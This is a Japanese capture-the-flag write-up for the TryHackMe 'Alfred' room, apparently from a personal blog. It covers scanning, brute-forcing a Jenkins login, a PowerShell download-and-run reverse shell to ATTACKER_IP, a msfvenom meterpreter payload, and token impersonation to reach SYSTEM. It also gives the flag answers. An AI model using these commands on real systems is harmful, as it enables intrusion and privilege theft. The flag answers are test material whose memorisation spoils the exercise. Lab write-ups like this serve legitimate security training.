---
title: "Alfred Writeup"
date: 2023-06-13
tags: [writeup, ctf, tryhackme]
description: "TryHackMeのAlfredルームで、Burp Intruderを使ってJenkinsログインをブルートフォースし、PowerShellリバースシェルからトークン偽装による権限昇格へと繋げていく手順の解説。"
---

やあ、読んでくれてありがとう！

進める前に一言伝えておきたいんだけど、もし君が初心者なら、このWriteupを単なる「楽な抜け道」として使わないでほしい。前のトレーニング/解説ルームに戻って復習してから、このルームにチャレンジしてみてくれ。答えも載せているし、フラグも_マスキングなし_でそのまま置いている。だからといって、コピペして終わりにはしないでほしいんだ。本当に手詰まりになって行き詰まったときにだけ参考にしてくれ。

ということで、役に立ったら嬉しいよ😄

## セットアップ

まずはTryHackMeのVPNサーバーに接続する必要がある。これに関する詳しい情報は[Access](https://tryhackme.com/access)ページで確認できるよ。

ここではサーバーへの接続にopenvpnを使う。コマンドはこちら：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## 偵察（Reconnaissance）

サクッと `nmap` スキャンを実行して、役立つ情報をいくつか手に入れよう：
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> 開いているポートはいくつありますか？（TCPのみ）
>
> 答え: 3

適切な攻撃ベクトルを見つけるためのOSフィンガープリンティング：
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

サーバーは何らかのWindows OSで動いていると見て間違いなさそうだ。ポート80でhttpサーバーが、ポート8080でプロキシが稼働している。ポート80のサイトにアクセスしてみると、こう表示される：
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

ポート8080のページにアクセスすると、以下の画面が表示される：
![Port 8080 page](/assets/img/writeup_assets/alfred/port-8080-login.png)

このWebページはログインポータルになっているので、`hydra` やBurp SuiteのIntruderを使ってブルートフォースを仕掛け、認証情報を取得できる。

今回はBurp Suiteを使ってSniper攻撃を仕掛け、認証情報を手に入れることにする...
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



こうして手に入れた認証情報を使って、ポータルへのログインを試みる。

> ログインパネルのユーザー名とパスワードは何ですか？（username:password の形式）
>
> 答え: `admin:admin`


## アクセス権の奪取（Gaining Access）

ポータルにログインすると、いろいろな操作ができるダッシュボードが表示される。
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

ダッシュボードの `New Item` ツールを使えば、リバースシェルアクセスを得るために実行させるペイロードをアップロードできる。これを行うには、まずPowerShellを使うリバースTCPシェルが必要になる。このルームの最初のタスクで指示されている通り、このPowerShellスクリプトには `nishang` を使用する。

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

シェルを用意したら、`NewItem` ツールを使ってファイルをアップロードし、サーバーに以下のコマンドを実行させることができる：
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

プロジェクトが作成されると設定画面にリダイレクトされるので、そこで先ほど記載したコマンドを実行するようワークフローに指定できる：

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

先に進む前に、リモートサーバーが接続してPowerShellスクリプトを取得できるように、自分のマシン上でhttpサーバーを起動しておく必要がある。
***注***: これを機能させるには、スクリプトファイルがカレントワーキングディレクトリにある必要がある。

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

また、リバースシェル用のリスナーも起動しておく必要がある：
```shell-session
$ nc -nvlp 4445
```

ここまで準備ができたら、プロジェクトメニューの左側に表示されている `Build Now` オプションをクリックして、いよいよワークフローを実行できる。これで操作可能なシェルが手に入る：
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

無事にuserフラグを取得できたので、次は特権昇格に進もう。

> user.txtのフラグは何ですか？
>
> 答え: `79007a09481963edf2e1321abd9ae2a0`

## 特権昇格（Privilege Escalation）

扱いやすくするために、権限昇格のセクションではMeterpreterシェルを使うことにする。まず、リバースシェル用のペイロードを生成する必要がある：
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
自分のマシン上でリスナーが必要になる：
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


プロジェクトの設定にビルド手順を追加して、ターゲットマシンにアップロードする：
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

プロジェクトをビルドすると先ほどのシェルが得られるので、そこで次のコマンドを実行できる：
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

これでMeterpreterシェルが起動する。


> 生成したexeペイロードの最終的なサイズは何バイトですか？
>
> 答え: `73802`

使い勝手の良いMeterpreterシェルが手に入ったので、どんな権限を持っているか確認してみよう：
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

ユーザー `alfred` として、`SeDebugPrivilege`、`SeImpersonatePrivilege`、`SeCreateGlobalPrivilege` の権限が有効になっていることがわかる。`incognito` モジュールを読み込めば、トークンを一覧表示できるようになる：

```shell-session
PS > ^C
Terminate channel 1? [y/N]  y                                                             
meterpreter > load incognito                                                              
Loading extension incognito...Success.                                                    
meterpreter > list_tokens -g                                                              
[-] Warning: Not currently running as SYSTEM, not all tokens will be available            
             Call rev2self if primary process token is SYSTEM                             
                                                                                          
Delegation Tokens Available                                                               
========================================                                                  
\                                                                                         
BUILTIN\Administrators                                                                    
BUILTIN\IIS_IUSRS                                                                         
BUILTIN\Users                                                                             
NT AUTHORITY\Authenticated Users                                                          
NT AUTHORITY\NTLM Authentication                                                          
NT AUTHORITY\SERVICE                                                                      
NT AUTHORITY\This Organization                                                            
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\VSS
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

`BUILTIN\Administrators` トークンが利用可能なので、次のコマンドを使って管理者トークンを偽装（impersonate）できる：
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

`getuid` コマンドを実行して、管理者権限を持っていることを確認しよう：
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> getuidコマンドを実行したときの出力は何ですか？
>
> 答え: `NT AUTHORITY\SYSTEM`

タスクの指示通り、このプロセスを移行（migrate）する：
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668
[*] Migrating from 2176 to 668...
[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt" 
��dff0f748678f280250f25a45b8046b4a
```

> `C:\Windows\System32\config` にあるroot.txtファイルを読み取ってください
>
> 答え: `dff0f748678f280250f25a45b8046b4a`

## まとめ

もしこのWriteupが役に立ったら、[GitHub](https://github.com/NovusEdge)のフォローやリポジトリへのスターをぜひよろしく！: https://github.com/NovusEdge/thm-writeups


- ルーム: [Alfred](https://tryhackme.com/room/alfred)
